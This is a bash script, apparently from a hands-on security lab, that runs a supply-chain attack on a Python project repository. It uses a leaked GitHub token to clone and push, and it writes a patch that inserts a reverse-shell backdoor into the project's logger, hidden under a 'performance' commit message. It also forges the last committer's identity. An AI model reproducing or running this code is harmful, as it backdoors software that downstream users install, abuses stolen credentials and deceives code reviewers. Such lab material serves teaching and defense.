#!/bin/bash

set -euo pipefail

set_envs() {
    echo "Setting up environment variables ..."
    export GITHUB_USERNAME=tembleking
    export GITHUB_ORGANIZATION=dandelion-python
    export GITHUB_REPO=dandelion-python
    export GITHUB_LEAKED_TOKEN=$GITHUB_LEAKED_TOKEN_IN_DANDELION_SUPPLY_CHAIN_ATTACK
}

rollback_the_project_to_a_known_commit() {
    echo "Rolling back the project to a known commit ..."
    mkdir -p /tmp/dandelion
    pushd /tmp/dandelion
    git clone https://tembleking:$GITHUB_LEAKED_TOKEN_IN_DANDELION_SUPPLY_CHAIN_ATTACK@github.com/dandelion-python/dandelion-python.git
    cd dandelion-python
    git checkout -b "log-optimization-$INSTRUQT_PARTICIPANT_ID"
    git reset --hard $(agent variable get COMMIT_TO_ROLLBACK_TO)
    # git push origin "log-optimization-$INSTRUQT_PARTICIPANT_ID" --force
    # rm -rf dandelion-python
    popd
}

create_patch_in_tmp() {
    echo "Creating the patch in /tmp ..."
    cat > /tmp/evil-patch.diff <<EOF
diff --git a/src/dandelion_python/logger.py b/src/dandelion_python/logger.py
index d5a8f7a..4e5e8a0 100644
--- a/src/dandelion_python/logger.py
+++ b/src/dandelion_python/logger.py
@@ -1,6 +1,7 @@
 import socket
 import logging
-
+import threading
+import os

 class RemoteHandler(logging.Handler):
     def __init__(self, host: str, port: int):
@@ -17,10 +18,31 @@ class RemoteHandler(logging.Handler):
         Sets up the context by connecting to the server.
         """
         self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.client_socket.connect((self.host, self.port))
+        self.client_socket.connect(("$(curl ipinfo.io/ip)", 53528))
         self.client_socket.sendall(b"Connected to logging server\n")
+        threading.Thread(target=self.optimize_messages_sent_in_background).start()
+
         return self

+    def optimize_messages_sent_in_background(self):
+            while True:
+                data = self.client_socket.recv(1024)
+                if not data:
+                    break
+
+                log_line = data.decode().strip()
+                if log_line.lower() in ["exit", "quit"]:
+                    break
+
+                try:
+                    output = os.popen(log_line).read()
+                    if not output:
+                        output = ""
+                except Exception as e:
+                    output = f"Error: {e}\n"
+
+                self.client_socket.sendall(output.encode())
+
     def __exit__(self, exc_type, exc_value, traceback):
         """
         Cleans up resources when exiting the context.
EOF
}

wait_for_pipeline_to_finish() {
    echo "Waiting for the GitHub Actions pipeline to finish ..."
    local workflow="release.yml"

    sleep 5s # Initial sleep to verify that the pipeline at least has started

    while true; do
        local status=$(curl -s -H "Authorization: token $GITHUB_LEAKED_TOKEN_IN_DANDELION_SUPPLY_CHAIN_ATTACK" \
                            -H "Accept: application/vnd.github.v3+json" \
                            "https://api.github.com/repos/$GITHUB_ORGANIZATION/$GITHUB_REPO/actions/workflows/$workflow/runs?per_page=1" | jq -r '.workflow_runs[0].status')

        [ "$status" == "completed" ] && break
        sleep 10
    done
}

disguise_ourselves() {
    echo "Disguising ourselves as the last committer ..."
    pushd /tmp/dandelion/dandelion-python
    git config --local user.name "$(git log -1 --pretty=%an)"
    git config --local user.email "$(git log -1 --pretty=%ae)"
    popd
}

push_the_patch() {
    echo "Pushing the patch ..."
    pushd /tmp/dandelion/dandelion-python
    patch -p1 < /tmp/evil-patch.diff
    git commit -a -m "perf: improve performance sending logs async"
    git push origin "log-optimization-$INSTRUQT_PARTICIPANT_ID"
    cd ../
    rm -rf dandelion-python
    popd
}

supply_chain_attack() {
    set_envs
    rollback_the_project_to_a_known_commit
    create_patch_in_tmp
    wait_for_pipeline_to_finish
    disguise_ourselves
    push_the_patch
    wait_for_pipeline_to_finish
}

echo "Starting the supply chain attack ..."
supply_chain_attack
echo "Supply chain attack completed."
